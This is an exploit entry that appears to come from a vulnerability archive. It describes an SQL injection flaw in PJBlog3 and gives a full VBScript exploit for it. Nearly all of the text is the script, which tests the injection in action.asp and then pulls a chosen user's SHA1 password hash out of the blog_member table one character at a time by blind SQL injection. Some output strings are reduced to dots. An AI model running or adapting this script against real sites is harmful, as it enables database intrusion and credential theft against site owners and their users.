source: https://www.securityfocus.com/bid/34701/info

PJBlog3 is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.

Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.

If WScript.Arguments.Count <> 2 Then
        WScript.Echo "Usage: Cscript.exe Exp.vbs ........ ......."
        WScript.Echo "Example: Cscript.exe Exp.vbs http://www.pjhome.net puterjam"
        WScript.Quit
End If

attackUrl = WScript.Arguments(0)
attackUser = WScript.Arguments(1)
attackUrl = Replace(attackUrl,"\","/")
If Right(attackUrl , 1) <> "/" Then
        attackUrl = attackUrl & "/"
End If
SHA1Charset = "0123456789ABCDEFJ"
strHoleUrl = attackUrl & "action.asp?action=checkAlias&cname=0kee"""

If IsSuccess(strHoleUrl & "or ""1""=""1") And Not IsSuccess(strHoleUrl & "and ""1""=""2") Then
        WScript.Echo "......."
Else
        WScript.Echo "......."
        WScript.Quit
End If

For n=1 To 40
        For i=1 To 17
                strInject = strHoleUrl & " Or 0<(Select Count(*) From blog_member Where mem_name='" & attackUser & "' And mem_password>='" & strResult & Mid(SHA1Charset, i, 1) & "') And ""1""=""1"
                If Not IsSuccess(strInject) Then
                        strResult = strResult & Mid(SHA1Charset, i-1, 1)
                        Exit For
                End If
                strPrint = chr(13) & "Password(SHA1): " & strResult & Mid(SHA1Charset, i, 1)
                WScript.StdOut.Write strPrint
        Next
Next
WScript.Echo Chr(13) & Chr (10) & "Done!"

Function PostData(PostUrl)
	Dim Http
	Set Http = CreateObject("msxml2.serverXMLHTTP")
	With Http
		.Open "GET",PostUrl,False
		.Send ()
		PostData = .ResponseBody
	End With
	Set Http = Nothing
	PostData =bytes2BSTR(PostData)
End Function

Function bytes2BSTR(vIn)
	Dim strReturn
	Dim I, ThisCharCode, NextCharCode
	strReturn = ""
	For I = 1 To LenB(vIn)
		ThisCharCode = AscB(MidB(vIn, I, 1))
		If ThisCharCode < &H80 Then
			strReturn = strReturn & Chr(ThisCharCode)
		Else
			NextCharCode = AscB(MidB(vIn, I + 1, 1))
			strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode))
			I = I + 1
		End If
	Next
	bytes2BSTR = strReturn
End Function

Function IsSuccess(PostUrl)

strData = PostData(PostUrl)
'Wscript.Echo strData
if InStr(strData,"check_error") >0 then
        IsSuccess = True
Else
        IsSuccess = False
End If
'Wscript.Sleep 500 '.......
End Function